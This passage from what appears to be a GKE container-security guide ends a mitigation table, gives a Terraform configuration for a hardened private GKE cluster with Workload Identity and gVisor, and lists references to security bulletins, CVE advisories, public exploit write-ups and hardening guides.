| **Metadata concealment** | CVE-2020-8554 MITM target | Enable GKE metadata concealment / Workload Identity |
| **Suricata / Network IDS** | All network attacks | Deploy Suricata for network traffic inspection |

### 7.4 GKE-Specific Security Features

```hcl
# Terraform configuration for hardened GKE cluster
resource "google_container_cluster" "secure" {
  # Enable Shielded GKE Nodes
  enable_shielded_nodes = true

  # Private cluster
  private_cluster_config {
    enable_private_nodes    = true
    enable_private_endpoint = false
    master_ipv4_cidr_block  = "172.16.0.0/28"
  }

  # Master authorized networks
  master_authorized_networks_config {
    cidr_blocks {
      cidr_block   = "10.0.0.0/8"
      display_name = "Internal only"
    }
  }

  # Binary Authorization
  binary_authorization {
    evaluation_mode = "PROJECT_SINGLETON_POLICY_RESOURCE"
  }

  # Workload Identity (prevents metadata MITM)
  workload_identity_config {
    workload_pool = "${var.project_id}.svc.id.goog"
  }

  # Enable intranode visibility for network policies
  enable_intranode_visibility = true

  node_config {
    # GKE Sandbox (gVisor)
    sandbox_config {
      sandbox_type = "gvisor"
    }

    # Shielded instance config
    shielded_instance_config {
      enable_secure_boot          = true
      enable_integrity_monitoring = true
    }

    # Minimal OAuth scopes
    oauth_scopes = [
      "https://www.googleapis.com/auth/cloud-platform",
    ]
  }
}
```

---

## 8. References

### GKE Security Bulletins
- [GKE Security Bulletins Index](https://cloud.google.com/kubernetes-engine/security-bulletins)
- [GCP-2019-002 (CVE-2019-5736)](https://cloud.google.com/kubernetes-engine/security-bulletins#gcp-2019-002)
- [GCP-2021-015 (CVE-2021-22555)](https://cloud.google.com/kubernetes-engine/security-bulletins#gcp-2021-015)
- [GCP-2022-002 (CVE-2022-0185)](https://cloud.google.com/kubernetes-engine/security-bulletins#gcp-2022-002)
- [GCP-2022-008 (CVE-2022-0847)](https://cloud.google.com/kubernetes-engine/security-bulletins#gcp-2022-008)
- [GCP-2020-015 (CVE-2020-8554)](https://cloud.google.com/kubernetes-engine/security-bulletins#gcp-2020-015)
- [GCP-2024-005 (CVE-2024-21626)](https://cloud.google.com/kubernetes-engine/security-bulletins#gcp-2024-005)

### Upstream Kubernetes Security
- [Kubernetes Security Advisories](https://github.com/kubernetes/kubernetes/security/advisories)
- [Kubernetes CVE Feed](https://kubernetes.io/docs/reference/issues-security/official-cve-feed/)
- [CVE-2019-11253 Advisory](https://github.com/kubernetes/kubernetes/issues/83253)
- [CVE-2020-8559 Advisory](https://github.com/kubernetes/kubernetes/issues/92914)

### Exploit References
- [CVE-2022-0847 (Dirty Pipe) Original Advisory](https://dirtypipe.cm4all.com/)
- [CVE-2022-0185 Writeup by Crusaders of Rust](https://www.willsroot.io/2022/01/cve-2022-0185.html)
- [CVE-2021-22555 Writeup by Andy Nguyen](https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html)
- [CVE-2019-5736 runc Escape PoC](https://github.com/Frichetten/CVE-2019-5736-PoC)
- [CVE-2024-21626 runc Escape Advisory](https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv)

### GKE Hardening Guide
- [GKE Hardening Guide](https://cloud.google.com/kubernetes-engine/docs/how-to/hardening-your-cluster)
- [GKE Security Overview](https://cloud.google.com/kubernetes-engine/docs/concepts/security-overview)
- [Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
